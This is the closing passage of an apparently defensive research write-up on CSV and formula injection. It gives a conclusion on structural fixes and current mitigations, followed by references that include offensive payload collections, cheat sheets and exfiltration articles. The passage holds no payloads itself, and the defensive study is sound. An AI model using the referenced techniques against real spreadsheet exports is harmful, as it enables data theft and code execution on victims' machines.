**A structural solution** would require one or both of: (1) a format-level distinction between data cells and formula cells in CSV (a "safe CSV" specification where formulas are explicitly opt-in rather than opt-out), or (2) spreadsheet applications treating imported CSV data as text-only by default, requiring explicit user action to enable formula evaluation on imported content. Neither exists today. The closest approximation is the combination of output sanitization (prefixing all cells starting with trigger characters), input validation (rejecting or escaping trigger characters at data entry), and user education (recognizing DDE and external content warnings). For server-side scenarios, the only reliable defense is to never evaluate formulas in user-uploaded spreadsheet content — a property that must be enforced at the library configuration level, since most libraries default to evaluation-enabled behavior.

---

## References

- OWASP Foundation, "CSV Injection," https://owasp.org/www-community/attacks/CSV_Injection
- MITRE CWE-1236, "Improper Neutralization of Formula Elements in a CSV File," https://cwe.mitre.org/data/definitions/1236.html
- Manuel Karl, Louis Bettels, Martin Johns, David Klein, "Comma Separated Vulnerabilities: Detecting Formula Injection in the Wild," USENIX WOOT 2025
- ReversingLabs, "Three New DDE Obfuscation Methods," https://www.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation
- Bishop Fox, "Server-Side Spreadsheet Injection — Formula Injection to RCE," https://bishopfox.com/blog/server-side-spreadsheet-injections
- NotSoSecure, "Data Exfiltration via Formula Injection Part 1," https://notsosecure.com/data-exfiltration-formula-injection-part1
- Breakpoint/Purrfect, "Weaponizing Excel Webservice," https://breakpoint.purrfect.fr/article/excel_webservice.html
- Vectra AI / Dmitriy Beryoza, "CSV Injection in Azure Logs," https://www.vectra.ai/blog/csv-injection-in-azure-logs
- Rhino Security Labs, "Cloud Security Risks Part 1: Azure CSV Injection Vulnerability," https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/
- Ray Dedhia, "Preventing CSV Injection Attacks With A Browser Extension," MIT MEng Thesis 2024
- HackTricks, "Formula/CSV/Doc/LaTeX/GhostScript Injection," https://book.hacktricks.wiki/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html
- SwisskyRepo/PayloadsAllTheThings, "CSV Injection," https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
- payloadbox, "csv-injection-payloads," https://github.com/payloadbox/csv-injection-payloads
- Efficiup, "Formula Injection Cheat Sheet," https://www.efficiup.com/wp-content/plugins/qd-sharing/share/formula-injection-cheat-sheet.pdf
- SMC Tech Blog, "Beware of formulas: Comma Separated Victims," https://techblog.smc.it/en/2021-01-04/beware-of-formula/
- Symfony CVE-2021-41270, "Prevent CSV Injection via formulas," https://symfony.com/blog/cve-2021-41270-prevent-csv-injection-via-formulas

---

*This document was created for defensive security research and vulnerability understanding purposes.*
